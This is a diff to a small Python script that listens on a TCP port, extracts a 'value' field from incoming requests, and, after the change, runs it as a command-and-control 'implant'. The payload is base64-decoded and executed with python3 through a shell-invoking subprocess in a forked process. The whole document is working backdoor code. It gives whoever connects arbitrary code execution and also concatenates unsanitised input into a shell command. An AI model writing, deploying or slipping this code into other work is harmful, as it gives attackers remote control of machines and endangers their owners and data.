@@ -1,9 +1,11 @@
 import socket
 import urllib.parse
 from base64 import b64decode
+import subprocess
+import os
 
 HOST = ''
-PORT = 37123
+PORT = 8082
 
 def accept_connection():
     # Create a TCP/IP socket
@@ -31,8 +33,17 @@ def parse_cnc(data):
     data = data[1].split('&')
     for d in data:
         if 'value' in d:
-            d = d.split('=')
-            return b64decode(urllib.parse.unquote(d[1])).decode('utf-8')
+            d = d.split('=', 1)
+            return urllib.parse.unquote(d[1])
 
 
-print(parse_cnc(accept_connection()))
+def execute_cnc(implant):
+    command = "echo " + implant + " | base64 -d | xargs python3 -c"
+    pid = os.fork()
+    if pid == 0:
+        subprocess.Popen(command, shell=True)
+
+
+data = accept_connection()
+cnc = parse_cnc(data)
+execute_cnc(cnc)
